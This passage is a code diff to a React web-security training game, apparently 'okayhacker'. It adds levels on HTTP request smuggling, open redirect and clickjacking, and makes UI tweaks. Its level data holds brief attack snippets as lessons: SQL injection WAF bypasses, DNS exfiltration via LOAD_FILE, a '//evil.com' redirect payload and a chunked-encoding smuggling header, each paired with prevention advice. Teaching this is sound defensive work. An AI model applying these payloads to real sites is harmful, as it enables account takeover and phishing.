+          'Techniques include: truncation attacks, scientific notation...',
         when:
-          'Advanced SQL injection scenarios: bypassing WAFs, exploiting strict filters, second-order SQLi, stored procedure injection, and attacking hardened applications. Modern ORMs and prepared statements have reduced but not eliminated these vectors.',
+          'Advanced SQL injection scenarios...',
         example:
-          "Truncation: ‘admin@evil.com’ + spaces to push ‘@evil.com’ beyond field limit = ‘admin’ account takeover. WAF bypass: SeLeCt/**/FrOm. MySQL specific: /*!50000SELECT*/. Time-based: BENCHMARK(). DNS exfiltration: LOAD_FILE() with UNC paths.",
+          "Truncation via field limits; WAF bypass tricks...",
         impact:
-          'Authentication bypass, data exfiltration, privilege escalation, and potential remote code execution through database-specific features.',
+          'Authentication bypass, data exfiltration...',
         prevention:
-          'Use parameterized queries consistently, validate data length before database insertion, disable dangerous functions, implement proper logging and monitoring, and keep databases updated.',
+          'Parameterized queries, input length validation...',
       },
       learning:
-        '💡 Validate input length and use parameterized queries! Know your database’s quirks.',
+        '💡 Validate input length and use parameterized queries! Know your DB’s quirks.',
+    },
+    // NEW LEVELS
+    {
+      id: 18,
+      name: 'HTTP Request Smuggling',
+      icon: <Network className="w-5 h-5" />,
+      difficulty: 'Advanced',
+      category: 'Proxy/Edge',
+      description: 'CL/TE desync',
+      objective:
+        "Smuggle a request by forcing chunked parsing (enter the header exactly).",
+      hints: [
+        'Proxies may disagree on Content-Length vs Transfer-Encoding.',
+        'Chunked parsing often wins when TE is present.',
+        "Header to trigger chunked mode: Transfer-Encoding: chunked",
+      ],
+      instruction:
+        "$ proxy_test --headers [INPUT]\n[!] Reverse Proxy v1.9\nEnter header:",
+      modalContent: {
+        title: 'HTTP Request Smuggling (CL.TE / TE.CL)',
+        description:
+          'When front and back proxies parse request bodies differently, attackers can smuggle a hidden request...',
+        technical:
+          'Classic vectors: CL.TE and TE.CL with crafted chunk sizes...',
+        when:
+          'Affects CDNs, WAFs, load balancers, mixed stacks...',
+        example:
+          'Send TE: chunked with misleading CL to prepend a second request...',
+        impact:
+          'Cache poisoning, credential theft, internal request forgery.',
+        prevention:
+          'Normalize at the edge, strip ambiguous headers.',
+      },
+      learning:
+        '💡 Normalize request parsing at the edge. Never allow CL and TE ambiguity.',
+    },
+    {
+      id: 19,
+      name: 'Open Redirect',
+      icon: <Globe className="w-5 h-5" />,
+      difficulty: 'Intermediate',
+      category: 'Web',
+      description: 'Protocol-relative redirect',
+      objective:
+        'Abuse next= parameter with a protocol-relative URL to leave the site.',
+      hints: [
+        'Some filters only block http:// and https:// prefixes.',
+        'Protocol-relative URLs start with //',
+        'Try a destination like //evil.com',
+      ],
+      instruction:
+        "$ GET /login?next=[INPUT]\n[!] Router v2.4\nProvide redirect target:",
+      modalContent: {
+        title: 'Open Redirect (Unvalidated Redirects)',
+        description:
+          'Unvalidated redirects enable phishing and token theft by sending users to attacker domains.',
+        technical:
+          'Bypass patterns: //host, mixed-case schemes, encoded schemes.',
+        when:
+          'Common on login, logout, OAuth, magic links.',
+        example:
+          'next=//evil.com still leaves the origin if only http(s) is blacklisted.',
+        impact:
+          'Phishing, session fixation, trust erosion.',
+        prevention:
+          'Enforce allowlists of internal paths; validate server-side.',
+      },
+      learning:
+        '💡 Validate redirect targets against a strict allowlist; prefer internal relative paths.',
+    },
+    {
+      id: 20,
+      name: 'Clickjacking Defense',
+      icon: <Shield className="w-5 h-5" />,
+      difficulty: 'Beginner',
+      category: 'Headers',
+      description: 'Frame busting via header',
+      objective:
+        "Set the header that blocks framing outright (enter it exactly).",
+      hints: [
+        'Legacy header still widely honored.',
+        'Short and to the point.',
+        'Format: X-Frame-Options: DENY',
+      ],
+      instruction:
+        "$ set_header [INPUT]\n[!] Security Headers v1.0\nHeader:",
+      modalContent: {
+        title: 'Clickjacking (UI Redress) & Mitigations',
+        description:
+          'Framing a site in a transparent overlay can trick users into clicking hidden controls.',
+        technical:
+          'Defenses include X-Frame-Options and CSP frame-ancestors.',
+        when:
+          'Payment approvals, admin panels, destructive actions, SSO prompts.',
+        example:
+          'Using DENY prevents any framing across origins, including same-origin frames.',
+        impact:
+          'Account takeover via invisible click flows, consent spoofing.',
+        prevention:
+          "Set both X-Frame-Options: DENY and CSP frame-ancestors 'none'.",
+      },
+      learning:
+        '💡 Use both X-Frame-Options and CSP frame-ancestors to stop framing attacks.',
     },
   ];
 
-  // Achievements definitions
+  // Achievements
   const achievements = [
     { id: 'first_hack', name: 'First Blood', description: 'Complete your first level', icon: '🩸', color: 'from-red-500 to-red-600' },
     { id: 'no_hints', name: 'Solo Hunter', description: 'Complete 3 levels without hints', icon: '🎯', color: 'from-green-500 to-green-600' },
     { id: 'speed_demon', name: 'Speed Demon', description: 'Complete a level in under 30 seconds', icon: '⚡', color: 'from-yellow-500 to-yellow-600' },
-    { id: 'halfway', name: 'Rising Threat', description: 'Complete 9 levels', icon: '📈', color: 'from-blue-500 to-blue-600' },
+    { id: 'halfway', name: 'Rising Threat', description: 'Complete 10 levels', icon: '📈', color: 'from-blue-500 to-blue-600' },
     { id: 'perfect_run', name: 'Flawless', description: '5 levels without wrong answers', icon: '💎', color: 'from-purple-500 to-purple-600' },
-    { id: 'master_hacker', name: 'Elite Hacker', description: 'Complete all 17 levels', icon: '👑', color: 'from-pink-500 to-cyan-500' },
+    { id: 'master_hacker', name: 'Elite Hacker', description: 'Complete all 20 levels', icon: '👑', color: 'from-pink-500 to-cyan-500' },
   ];
 
   // Auto-scroll terminal
@@ -682,15 +786,31 @@ const OkayHackerGame = () => {
     }
   }, [terminalOutput]);
 
+  // Lock body scroll when modal is open (prevents mobile “minimize” issue)
+  useEffect(() => {
+    if (typeof document !== 'undefined') {
+      const prev = document.body.style.overflow;
+      document.body.style.overflow = showLevelModal ? 'hidden' : prev || '';
+      return () => { document.body.style.overflow = prev; };
+    }
+  }, [showLevelModal]);
+
   // Show level modal when starting or changing level
   useEffect(() => {
     if (gameStarted && currentLevel < levels.length && !gameCompleted) {
       setShowLevelModal(true);
       setLevelStartTime(Date.now());
     }
-  }, [currentLevel, gameStarted]);
+  }, [currentLevel, gameStarted, gameCompleted, levels.length]);
 
-  // Typewriter effect for future use (not currently used in UI)
+  // Focus input after modal closes
+  useEffect(() => {
+    if (gameStarted && !showLevelModal) {
+      setTimeout(() => inputRef.current?.focus(), 80);
+    }
+  }, [showLevelModal, gameStarted]);
+
+  // Typewriter (reserved)
   const typewriterEffect = (text: string, callback?: () => void) => {
     setIsTyping(true);
     let index = 0;
@@ -706,6 +826,7 @@ const OkayHackerGame = () => {
   };
 
   const addToTerminal = (message: string, type = 'user') => {
+    // Timestamp formatting happens client-side on interaction, not during SSR.
     const timestamp = new Date().toLocaleTimeString('en-US', {
       hour12: false,
       hour: '2-digit',
@@ -761,7 +882,6 @@ const OkayHackerGame = () => {
 
   const handleSubmit = () => {
     if (!userInput || levelCompleted) return;
-    // Add to history
     if (userInput.trim()) {
       setTerminalHistory((prev) => [...prev, userInput]);
       setHistoryIndex(-1);
@@ -788,7 +908,7 @@ const OkayHackerGame = () => {
       if (currentLevel === 0) unlockAchievement('first_hack');
       if (hints === 0 && currentLevel >= 2) unlockAchievement('no_hints');
       if (timeElapsed < 30000) unlockAchievement('speed_demon');
-      if (currentLevel === 8) unlockAchievement('halfway');
+      if (currentLevel === 9) unlockAchievement('halfway'); // 10th level
       addToTerminal(``, 'empty');
       addToTerminal(level.learning, 'learning');
       setTimeout(() => {
@@ -881,14 +1001,21 @@ const OkayHackerGame = () => {
           <Terminal className="w-3 h-3" />
           <span>okayhacker@localhost — bash — {terminalOutput.length} lines</span>
         </div>
-        <div className="text-gray-500 text-xs bg-gray-700/50 px-2 py-1 rounded">
+        <div className="text-gray-500 text-xs bg-gray-700/50 px-2 py-1 rounded" suppressHydrationWarning>
           Level {currentLevel + 1}/{levels.length}
         </div>
       </div>
       {/* Terminal Content */}
       <div
         ref={terminalRef}
-        className="bg-black p-4 h-[400px] md:h-[450px] lg:h-[500px] overflow-y-auto font-mono text-xs md:text-sm custom-scrollbar"
+        className="
+          bg-black p-4
+          h-[45dvh] sm:h-[50dvh] md:h-[55dvh] lg:h-[60dvh]
+          min-h-[260px] max-h-[70dvh]
+          overflow-y-auto
+          font-mono text-xs md:text-sm custom-scrollbar
+          overscroll-contain
+        "
       >
         {terminalOutput.map((output: any, index: number) => (
           <div
@@ -936,7 +1063,7 @@ const OkayHackerGame = () => {
         <div className="h-4" />
       </div>
       {/* Input Area */}
-      <div className="bg-gradient-to-r from-gray-900 to-gray-850 border-t border-gray-800 p-4">
+      <div className="bg-gradient-to-r from-gray-900 to-gray-850 border-t border-gray-800 p-4 sticky bottom-0">
         <div className="flex items-center space-x-2">
           <span className="text-green-400 text-xs md:text-sm font-semibold">┌─[okayhacker]─[$]</span>
         </div>
@@ -956,11 +1083,13 @@ const OkayHackerGame = () => {
             autoComplete="off"
             autoCorrect="off"
             autoCapitalize="off"
+            inputMode="text"
           />
           {currentLevel === 1 && (
             <button
               onClick={() => setShowPassword(!showPassword)}
               className="text-gray-500 hover:text-gray-300 transition-colors"
+              aria-label={showPassword ? 'Hide password' : 'Show password'}
             >
               {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
             </button>
@@ -976,9 +1105,9 @@ const OkayHackerGame = () => {
     const level = levels[currentLevel];
     return (
       <div className="fixed inset-0 bg-black/90 backdrop-blur-sm flex items-center justify-center z-50 p-4 animate-fadeIn">
-        <div className="bg-gradient-to-br from-gray-900 via-gray-900 to-black rounded-2xl max-w-4xl w-full border border-pink-500/30 shadow-2xl shadow-pink-500/20 overflow-hidden">
-          <div className="bg-gradient-to-r from-pink-500/10 to-cyan-500/10 p-6 md:p-8">
-            <div className="flex flex-col md:flex-row items-start md:items-center justify-between mb-6">
+        <div className="bg-gradient-to-br from-gray-900 via-gray-900 to-black rounded-2xl w-full max-w-4xl border border-pink-500/30 shadow-2xl shadow-pink-500/20 overflow-hidden">
+          <div className="bg-gradient-to-r from-pink-500/10 to-cyan-500/10 p-4 sm:p-6 md:p-8">
+            <div className="flex flex-col md:flex-row items-start md:items-center justify-between mb-4 md:mb-6">
               <div className="flex items-center space-x-4 mb-4 md:mb-0">
                 <div className="p-3 bg-gradient-to-br from-pink-500/20 to-cyan-500/20 rounded-xl border border-pink-500/30">
                   {level.icon}
@@ -1012,7 +1141,7 @@ const OkayHackerGame = () => {
                 </div>
               </div>
             </div>
-            <div className="space-y-4 max-h-[60vh] overflow-y-auto custom-scrollbar pr-2">
+            <div className="space-y-4 max-h-[70dvh] overflow-y-auto custom-scrollbar pr-2">
               {/* Main Info Card */}
               <div className="bg-black/40 rounded-xl p-4 md:p-6 border border-gray-800">
                 <h3 className="text-pink-400 font-bold mb-3 flex items-center text-lg">
@@ -1081,76 +1210,92 @@ const OkayHackerGame = () => {
   // Landing Page (shown before the game starts)
   if (!gameStarted) {
     return (
-      <div className="min-h-screen bg-black text-white overflow-hidden">
-        <div className="relative min-h-screen flex items-center justify-center p-4 md:p-8">
+      <div className="min-h-[100dvh] bg-black text-white overflow-hidden">
+        <div className="relative min-h-[100dvh] flex items-center justify-center p-4 md:p-8">
           {/* Animated Background */}
           <div className="absolute inset-0">
             <div className="absolute inset-0 bg-gradient-to-br from-pink-500/5 via-black to-cyan-500/5"></div>
-            <div className="absolute top-20 left-20 w-48 md:w-72 h-48 md:h-72 bg-pink-500/20 rounded-full blur-3xl animate-pulse"></div>
-            <div className="absolute bottom-20 right-20 w-64 md:w-96 h-64 md:h-96 bg-cyan-500/20 rounded-full blur-3xl animate-pulse delay-1000"></div>
-            <div className="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 w-96 h-96 bg-purple-500/10 rounded-full blur-3xl animate-pulse delay-500"></div>
+            <div className="absolute top-20 left-4 sm:left-20 w-40 sm:w-72 h-40 sm:h-72 bg-pink-500/20 rounded-full blur-3xl animate-pulse"></div>
+            <div className="absolute bottom-20 right-4 sm:right-20 w-52 sm:w-96 h-52 sm:h-96 bg-cyan-500/20 rounded-full blur-3xl animate-pulse delay-1000"></div>
+            <div className="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 w-72 sm:w-96 h-72 sm:h-96 bg-purple-500/10 rounded-full blur-3xl animate-pulse delay-500"></div>
           </div>
+
           <div className="relative max-w-6xl mx-auto text-center">
-            <div className="mb-8 md:mb-12">
-              <div className="flex justify-center mb-6 md:mb-8">
-                <div className="relative">
-                  <div className="absolute inset-0 bg-gradient-to-r from-pink-500 to-cyan-500 blur-3xl opacity-50 animate-pulse"></div>
-                  <Layers className="w-20 h-20 md:w-32 md:h-32 text-pink-500 relative animate-float" />
-                </div>
+            {/* THE SYSTEM — stays on one line and won’t overwrite the next line */}
+<div className="glitch-wrap">
+  <GlitchText
+    speed={2}
+    enableShadows
+    enableOnHover
+    className="glitch-title"
+  >
+    The System
+  </GlitchText>
+</div>
+
+{/* Byline logo under it */}
+<h1 className="text-2xl sm:text-3xl md:text-4xl font-bold mt-2">
+  <span className="logo text-white tracking-tight">
+    brought to you by <span className="logo-em">okayhacker</span>
+  </span>
+</h1>
+
+
+            <p className="text-lg sm:text-xl md:text-3xl text-gray-400 mb-2">let&apos;s play</p>
+
+            {/* Suppress hydration warning on dynamic-length copy */}
+            <p className="text-sm md:text-lg text-gray-500" suppressHydrationWarning>
+              Master {levels.length} Real-World Cybersecurity Challenges
+            </p>
+
+            <div className="mt-8 md:mt-12 grid grid-cols-1 md:grid-cols-3 gap-4 md:gap-6 max-w-4xl mx-auto">
+              <div className="bg-gradient-to-br from-gray-900/80 to-black backdrop-blur border border-pink-500/20 rounded-xl p-6 transform hover:scale-105 transition-all">
+                <Shield className="w-8 h-8 text-pink-500 mb-3 mx-auto" />
+                <h3 className="text-lg font-bold mb-2 bg-gradient-to-r from-pink-400 to-pink-600 bg-clip-text text-transparent">
+                  OWASP Top 10
+                </h3>
+                <p className="text-xs md:text-sm text-gray-400">Real vulnerabilities from production systems</p>
               </div>
-              <h1 className="text-5xl md:text-7xl lg:text-8xl font-bold mb-2 md:mb-4">
-                <span className="bg-gradient-to-r from-pink-500 via-purple-500 to-cyan-500 bg-clip-text text-transparent animate-gradient">
-                  okayhacker
-                </span>
-              </h1>
-              <p className="text-xl md:text-3xl text-gray-400 mb-2">let's play</p>
-              <p className="text-sm md:text-lg text-gray-500">Master 17 Real-World Cybersecurity Challenges</p>
-              <div className="mt-8 md:mt-12 grid grid-cols-1 md:grid-cols-3 gap-4 md:gap-6 max-w-4xl mx-auto">
-                <div className="bg-gradient-to-br from-gray-900/80 to-black backdrop-blur border border-pink-500/20 rounded-xl p-6 transform hover:scale-105 transition-all">
-                  <Shield className="w-8 h-8 text-pink-500 mb-3 mx-auto" />
-                  <h3 className="text-lg font-bold mb-2 bg-gradient-to-r from-pink-400 to-pink-600 bg-clip-text text-transparent">
-                    OWASP Top 10
-                  </h3>
-                  <p className="text-xs md:text-sm text-gray-400">Real vulnerabilities from production systems</p>
-                </div>
-                <div className="bg-gradient-to-br from-gray-900/80 to-black backdrop-blur border border-cyan-500/20 rounded-xl p-6 transform hover:scale-105 transition-all">
-                  <Terminal className="w-8 h-8 text-cyan-500 mb-3 mx-auto" />
-                  <h3 className="text-lg font-bold mb-2 bg-gradient-to-r from-cyan-400 to-cyan-600 bg-clip-text text-transparent">
-                    macOS Terminal
-                  </h3>
-                  <p className="text-xs md:text-sm text-gray-400">Authentic command-line hacking experience</p>
-                </div>
-                <div className="bg-gradient-to-br from-gray-900/80 to-black backdrop-blur border border-purple-500/20 rounded-xl p-6 transform hover:scale-105 transition-all">
-                  <Award className="w-8 h-8 text-purple-500 mb-3 mx-auto" />
-                  <h3 className="text-lg font-bold mb-2 bg-gradient-to-r from-purple-400 to-purple-600 bg-clip-text text-transparent">
-                    Learn & Earn
-                  </h3>
-                  <p className="text-xs md:text-sm text-gray-400">Detailed explanations and achievement system</p>
-                </div>
+              <div className="bg-gradient-to-br from-gray-900/80 to-black backdrop-blur border border-cyan-500/20 rounded-xl p-6 transform hover:scale-105 transition-all">
+                <Terminal className="w-8 h-8 text-cyan-500 mb-3 mx-auto" />
+                <h3 className="text-lg font-bold mb-2 bg-gradient-to-r from-cyan-400 to-cyan-600 bg-clip-text text-transparent">
+                  macOS Terminal
+                </h3>
+                <p className="text-xs md:text-sm text-gray-400">Authentic command-line hacking experience</p>
               </div>
-              <button
-                onClick={handleStartGame}
-                className="mt-8 md:mt-12 bg-gradient-to-r from-pink-500 via-purple-500 to-cyan-500 hover:from-pink-600 hover:via-purple-600 hover:to-cyan-600 text-white font-bold py-4 px-8 md:px-12 rounded-xl text-lg md:text-xl transition-all transform hover:scale-105 shadow-2xl shadow-pink-500/25 animate-glow"
-              >
-                <Fingerprint className="inline w-6 h-6 mr-2" />
-                Initialize System
-              </button>
-              <p className="mt-6 md:mt-8 text-xs text-gray-600">
-                For educational purposes only. Practice responsible disclosure.
-              </p>
+              <div className="bg-gradient-to-br from-gray-900/80 to-black backdrop-blur border border-purple-500/20 rounded-xl p-6 transform hover:scale-105 transition-all">
+                <Award className="w-8 h-8 text-purple-500 mb-3 mx-auto" />
+                <h3 className="text-lg font-bold mb-2 bg-gradient-to-r from-purple-400 to-purple-600 bg-clip-text text-transparent">
+                  Learn & Earn
+                </h3>
+                <p className="text-xs md:text-sm text-gray-400">Detailed explanations and achievement system</p>
+              </div>
             </div>
+
+            <button
+              onClick={handleStartGame}
+              className="mt-8 md:mt-12 bg-gradient-to-r from-pink-500 via-purple-500 to-cyan-500 hover:from-pink-600 hover:via-purple-600 hover:to-cyan-600 text-white font-bold py-4 px-8 md:px-12 rounded-xl text-lg md:text-xl transition-all transform hover:scale-105 shadow-2xl shadow-pink-500/25"
+            >
+              <Fingerprint className="inline w-6 h-6 mr-2" />
+              Initialize -The System- v.2025.01.1940.a
+            </button>
+
+            <p className="mt-6 md:mt-8 text-xs text-gray-600">
+              Educational purposes only, yet mandatory information everyone should know about. Practice responsible disclosure.
+            </p>
+
             <div className="grid grid-cols-2 md:grid-cols-4 gap-4 mt-8 md:mt-12 max-w-2xl mx-auto">
-              <div className="text-center">
-                <p className="text-2xl md:text-3xl font-bold text-pink-500">17</p>
+              <div className="text-center" suppressHydrationWarning>
+                <p className="text-2xl md:text-3xl font-bold text-pink-500">{levels.length}</p>
                 <p className="text-xs text-gray-500">Challenges</p>
               </div>
               <div className="text-center">
                 <p className="text-2xl md:text-3xl font-bold text-cyan-500">6</p>
                 <p className="text-xs text-gray-500">Achievements</p>
               </div>
-              <div className="text-center">
-                <p className="text-2x md:text-3x font-bold text-purple-500">
-                  1700
+              <div className="text-center" suppressHydrationWarning>
+                <p className="text-2xl md:text-3xl font-bold text-purple-500">
+                  {levels.length * 100}
                 </p>
                 <p className="text-xs text-gray-500">Max Score</p>
               </div>
@@ -1161,6 +1306,45 @@ const OkayHackerGame = () => {
             </div>
           </div>
         </div>
+
+        
+        <style jsx global>{`
+          .logo {
+            font-family: "Helvetica Neue", Helvetica, Arial, "Liberation Sans", system-ui, -apple-system, "Segoe UI", sans-serif !important;
+            font-weight: 700 !important;
+            letter-spacing: -0.04em !important; /* tighter spacing */
+            color: #ffffff !important; /* solid white */
+          }
+        
+.glitch-wrap{
+  position: relative;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+
+  
+  height: clamp(56px, 7vw, 140px);
+  margin-bottom: 0.25rem; 
+  overflow: visible;      
+}
+
+.glitch-title{
+  white-space: nowrap !important;   
+  line-height: 1 !important;        
+  display: inline-block !important;  
+  pointer-events: none;              
+
+  
+  font-weight: 800;
+  font-size: clamp(32px, 7vw, 96px);
+}
+
+        
+.logo-em{
+  font-weight: 800;
+  letter-spacing: 0.02em;
+}
+        `}</style>
       </div>
     );
   }
@@ -1168,16 +1352,16 @@ const OkayHackerGame = () => {
   // Completion Screen (shown after all levels completed)
   if (gameCompleted) {
     return (
-      <div className="min-h-screen bg-black text-white flex items-center justify-center p-4 md:p-8">
+      <div className="min-h-[100dvh] bg-black text-white flex items-center justify-center p-4 md:p-8">
         <div className="relative">
           <div className="absolute inset-0 bg-gradient-to-br from-pink-500/20 to-cyan-500/20 blur-3xl animate-pulse"></div>
           <div className="relative max-w-5xl mx-auto text-center">
             <CheckCircle className="w-24 h-24 md:w-32 md:h-32 text-green-400 mx-auto mb-6 md:mb-8 animate-bounce" />
-            <h1 className="text-4xl md:text-6xl lg:text-7xl font-bold mb-4 bg-gradient-to-r from-pink-500 via-purple-500 to-cyan-500 bg-clip-text text-transparent">
+            <h1 className="text-4xl md:text-6xl lg:text-7xl font-bold mb-4 text-white">
               Elite Status Achieved
             </h1>
-            <p className="text-xl md:text-2xl text-gray-400 mb-6 md:mb-8">
-              You’ve mastered all 17 challenges
+            <p className="text-xl md:text-2xl text-gray-400 mb-6 md:mb-8" suppressHydrationWarning>
+              You’ve mastered all {levels.length} challenges
             </p>
             <div className="bg-gray-900/80 backdrop-blur rounded-lg p-8 mb-8 border border-pink-500/20">
               <h2 className="text-3xl font-bold mb-6">
@@ -1224,15 +1408,30 @@ const OkayHackerGame = () => {
   }
 
   // Main Game UI (shown while playing)
+  const currentHintsLeft = levels[currentLevel]?.hints?.length
+    ? Math.max(levels[currentLevel].hints.length - hints, 0)
+    : 0;
+
   return (
-    <div className="min-h-screen bg-black text-white">
+    <div className="min-h-[100dvh] bg-black text-white">
       <div className="max-w-7xl mx-auto p-4">
         {/* Header */}
-        <div className="flex justify-between items-center mb-6 bg-gray-900/50 backdrop-blur rounded-lg p-4 border border-gray-800">
+        <div className="flex flex-col sm:flex-row sm:justify-between sm:items-center gap-3 mb-6 bg-gray-900/50 backdrop-blur rounded-lg p-4 border border-gray-800">
           <div className="flex items-center space-x-4">
             <Layers className="w-8 h-8 text-pink-500" />
             <div>
-              <h1 className="text-2xl font-bold">okayhacker</h1>
+              {/* White logo with tighter tracking (inline styles lock spacing) */}
+              <h1
+                className="text-2xl font-bold"
+                style={{
+                  letterSpacing: '-0.04em',
+                  color: '#ffffff',
+                  fontFamily: '"Helvetica Neue", Helvetica, Arial, "Liberation Sans", system-ui, -apple-system, "Segoe UI", sans-serif',
+                  fontWeight: 700,
+                }}
+              >
+                okayhacker
+              </h1>
               <p className="text-xs text-gray-500">Ethical Hacking Simulator</p>
             </div>
           </div>
@@ -1241,12 +1440,13 @@ const OkayHackerGame = () => {
               <p className="text-xs text-gray-500 uppercase">Score</p>
               <p className="text-xl font-bold text-pink-500">{score}</p>
             </div>
-            <div className="text-right">
+            <div className="text-right" suppressHydrationWarning>
               <p className="text-xs text-gray-500 uppercase">Progress</p>
               <p className="text-xl font-bold text-cyan-500">{currentLevel + 1}/{levels.length}</p>
             </div>
           </div>
         </div>
+
         <div className="grid grid-cols-1 lg:grid-cols-4 gap-6">
           {/* Sidebar */}
           <div className="lg:col-span-1 space-y-4">
@@ -1263,18 +1463,19 @@ const OkayHackerGame = () => {
                 </div>
                 <button
                   onClick={requestHint}
-                  disabled={levelCompleted || hints >= 3}
+                  disabled={levelCompleted || hints >= levels[currentLevel].hints.length}
                   className="w-full bg-gray-800 hover:bg-gray-700 disabled:bg-gray-900 disabled:cursor-not-allowed text-white text-sm font-medium py-2 px-4 rounded transition-colors border border-gray-700"
                 >
                   <Key className="w-4 h-4 inline mr-2" />
-                  Hint ({3 - hints}/3) [-25 pts]
+                  Hint ({currentHintsLeft}/{levels[currentLevel].hints.length}) [-25 pts]
                 </button>
               </div>
             </div>
+
             {/* Level Progress */}
             <div className="bg-gray-900/80 backdrop-blur rounded-lg p-4 border border-cyan-500/20">
               <h3 className="text-sm font-semibold text-cyan-400 mb-3 uppercase">All Levels</h3>
-              <div className="space-y-1 max-h-64 overflow-y-auto custom-scrollbar">
+              <div className="space-y-1 max-h-[50dvh] overflow-y-auto custom-scrollbar">
                 {levels.map((level, index) => (
                   <div
                     key={level.id}
@@ -1303,31 +1504,25 @@ const OkayHackerGame = () => {
               </div>
             </div>
           </div>
+
           {/* Main Terminal */}
           <div className="lg:col-span-3">
             {renderTerminal()}
             {/* Quick Commands */}
-            <div className="mt-4 flex items-center space-x-4 text-xs text-gray-500">
+            <div className="mt-4 flex flex-wrap items-center gap-3 text-xs text-gray-500">
               <span>Quick Commands:</span>
-              <button onClick={() => setUserInput('help')} className="text-cyan-400 hover:text-cyan-300">
-                help
-              </button>
+              <button onClick={() => setUserInput('help')} className="text-cyan-400 hover:text-cyan-300">help</button>
               <span>•</span>
-              <button onClick={() => setUserInput('hint')} className="text-pink-400 hover:text-pink-300">
-                hint
-              </button>
+              <button onClick={() => setUserInput('hint')} className="text-pink-400 hover:text-pink-300">hint</button>
               <span>•</span>
-              <button onClick={() => setUserInput('clear')} className="text-gray-400 hover:text-gray-300">
-                clear
-              </button>
+              <button onClick={() => setUserInput('clear')} className="text-gray-400 hover:text-gray-300">clear</button>
               <span>•</span>
-              <button onClick={() => setUserInput('info')} className="text-purple-400 hover:text-purple-300">
-                info
-              </button>
+              <button onClick={() => setUserInput('info')} className="text-purple-400 hover:text-purple-300">info</button>
               <span className="text-gray-600">↑↓ for history</span>
             </div>
           </div>
         </div>
+
         {/* Achievements Bar */}
         {unlockedAchievements.length > 0 && (
           <div className="mt-6 bg-gray-900/50 backdrop-blur rounded-lg p-4 border border-purple-500/20">
@@ -1348,37 +1543,18 @@ const OkayHackerGame = () => {
           </div>
         )}
       </div>
+
       {/* Level Modal */}
       <LevelModal />
+
       <style jsx>{`
-        .custom-scrollbar::-webkit-scrollbar {
-          width: 8px;
-        }
-        .custom-scrollbar::-webkit-scrollbar-track {
-          background: rgba(31, 41, 55, 0.5);
-          border-radius: 4px;
-        }
-        .custom-scrollbar::-webkit-scrollbar-thumb {
-          background: rgba(236, 72, 153, 0.3);
-          border-radius: 4px;
-        }
-        .custom-scrollbar::-webkit-scrollbar-thumb:hover {
-          background: rgba(236, 72, 153, 0.5);
-        }
-        .animate-pulse {
-          animation: pulse 2s cubic-bezier(0.4, 0, 0.6, 1) infinite;
-        }
-        .delay-1000 {
-          animation-delay: 1000ms;
-        }
-        @keyframes pulse {
-          0%, 100% {
-            opacity: 1;
-          }
-          50% {
-            opacity: 0.5;
-          }
-        }
+        .custom-scrollbar::-webkit-scrollbar { width: 8px; }
+        .custom-scrollbar::-webkit-scrollbar-track { background: rgba(31, 41, 55, 0.5); border-radius: 4px; }
+        .custom-scrollbar::-webkit-scrollbar-thumb { background: rgba(236, 72, 153, 0.3); border-radius: 4px; }
+        .custom-scrollbar::-webkit-scrollbar-thumb:hover { background: rgba(236, 72, 153, 0.5); }
+        .animate-pulse { animation: pulse 2s cubic-bezier(0.4, 0, 0.6, 1) infinite; }
+        .delay-1000 { animation-delay: 1000ms; }
+        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
       `}</style>
     </div>
   );
